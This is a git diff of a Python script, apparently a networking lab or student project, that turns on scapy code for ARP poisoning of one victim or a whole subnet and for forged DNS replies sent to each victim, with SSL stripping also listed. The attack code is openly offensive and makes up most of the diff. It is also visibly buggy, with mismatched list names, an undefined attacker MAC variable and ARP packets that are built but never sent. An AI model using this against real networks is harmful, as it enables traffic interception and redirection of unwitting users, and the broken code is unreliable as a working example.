@@ -1,7 +1,8 @@
 import sys, os, argparse 
 from util import bcolors, clear, parse_ip_input, validate_domain
-#import scapy
-#from scapy.all import *
+import scapy
+from scapy.all import *
+
 
 # The name of the network interface to use for sniffing and sending packets
 INTERFACE_NAME = "enp0s3"
@@ -10,6 +11,12 @@ ATTACKS = {
     'b': 'DNS spoofing',
     'c': 'SSL stripping'
 }
+
+IP_ATTACKER = ''
+MAC_ATTACKER = ''
+IP_VICTIMS = []
+MAC_VICTIMS = []
+
 
 # Set up argument parser for using arguments in the command line
 parser = argparse.ArgumentParser(
@@ -20,22 +27,25 @@ parser = argparse.ArgumentParser(
 
 
 def ARPposioning():
-    macAttacker= input("Enter MAC address of attacker: ")  
-    ipAttacker= input("Enter IP address of attacker: ")
+    IP_ATTACKER = input("Enter IP address of attacker: ")
+    MAC_ATTACKER = getmacbyip(IP_ATTACKER)
 
-    victimNumber=input('Do you want to spoof one or multiple victims? (1/m)')
+    victimNumber = input('Do you want to spoof one or multiple victims? (1/m)')
     if victimNumber == "1":
         ipVictim= input("Enter IP address of victim: ")
         macVictim= getmacbyip(ipVictim)
 
+        IPS_VICTIMS.append(ipVictim)
+        MACS_VICTIMS.append(macVictim)
+
         ipToSpoof= input("Enter IP address to spoof: ")
         print(ipVictim)
-        # arp=Ether() / ARP()
-        # arp[Ether].src= macAttacker
-        # arp[ARP].hwsrc= macAttacker
-        # arp[ARP].psrc= ipToSpoof
-        # arp[ARP].hwdst= macVictim
-        # arp[ARP].pdst= ipVictim
+        arp=Ether() / ARP()
+        arp[Ether].src= macAttacker
+        arp[ARP].hwsrc= macAttacker
+        arp[ARP].psrc= ipToSpoof
+        arp[ARP].hwdst= macVictim
+        arp[ARP].pdst= ipVictim
         print("\n\n")
     
     elif victimNumber == "m":   
@@ -50,13 +60,16 @@ def ARPposioning():
                 ipVictim= IPrange.split(".")[0]+"."+IPrange.split(".")[1]+"."+IPrange.split(".")[2]+"."+str(i)
                 macVictim= getmacbyip(ipVictim)
 
+                IPS_VICTIMS.append(ipVictim)
+                MACS_VICTIMS.append(macVictim)
+
                 print(ipVictim)
-                # arp=Ether() / ARP()
-                # arp[Ether].src= macAttacker
-                # arp[ARP].hwsrc= macAttacker
-                # arp[ARP].psrc= ipToSpoof
-                # arp[ARP].hwdst= macVictim
-                # arp[ARP].pdst= ipVictim
+                arp=Ether() / ARP()
+                arp[Ether].src= macAttacker
+                arp[ARP].hwsrc= macAttacker
+                arp[ARP].psrc= ipToSpoof
+                arp[ARP].hwdst= macVictim
+                arp[ARP].pdst= ipVictim
         else:
             print("Invalid input. Please try again.")
 
@@ -93,29 +106,25 @@ def DNSpoisoning():
 
     # Assumption: ARP poisoning has been applied to make the victim think the attacker is the router (where the DNS lookup message will be sent)
     # The data below is assumed from that ARP poisoning attack
-    mac_attacker = ''
-    mac_victim = ''
-    ip_attacker = ''
-    ip_victim = ''
+    for ip_victim in IP_VICTIMS:
+        dns = Ether() / IP() / UDP() / DNS()
+        
+        # Set the source and destination MAC and IP addresses (from attacker back to victim)
+        dns[Ether].src = MAC_ATTACKER
+        dns[Ether].dst = getmacbyip(ip_victim)
+        dns[IP].src = IP_ATTACKER
+        dns[IP].dst = ip_victim
 
-    # dns = Ether() / IP() / UDP() / DNS()
-    
-    # # Set the source and destination MAC and IP addresses (from attacker back to victim)
-    # dns[Ether].src = mac_attacker
-    # dns[Ether].dst = mac_victim
-    # dns[IP].src = ip_attacker
-    # dns[IP].dst = ip_victim
+        # Set the DNS packet's source and destination port to 53, the DNS port
+        dns[UDP].sport = 53
+        dns[UDP].dport = 53
 
-    # # Set the DNS packet's source and destination port to 53, the DNS port
-    # dns[UDP].sport = 53
-    # dns[UDP].dport = 53
+        dns[DNS].id = random.randint(0, 65535)                # Set the DNS packet's transaction ID to a random number
+        dns[DNS].qd = DNSQR(qname=dns_domain)                 # Set the DNS packet's query to the domain name to be spoofed
+        dns[DNS].an = DNSRR(rrname=dns_domain, rdata=dns_ip)  # Set the DNS packet's answer to the IP address of your choice
 
-    # dns[DNS].id = random.randint(0, 65535)                # Set the DNS packet's transaction ID to a random number
-    # dns[DNS].qd = DNSQR(qname=dns_domain)                 # Set the DNS packet's query to the domain name to be spoofed
-    # dns[DNS].an = DNSRR(rrname=dns_domain, rdata=dns_ip)  # Set the DNS packet's answer to the IP address of your choice
-
-    # # Send the DNS packet
-    # sendp(dns, iface=INTERFACE_NAME)
+        # Send the DNS packet
+        sendp(dns, iface=INTERFACE_NAME)
 
     print(f'\n{bcolors.OKCYAN}{ATTACKS["b"]}{bcolors.ENDC} has been executed (sent a packet to victim resolving {bcolors.OKCYAN}{dns_domain}{bcolors.ENDC} to {bcolors.OKCYAN}{dns_ip}{bcolors.ENDC})\n')
 
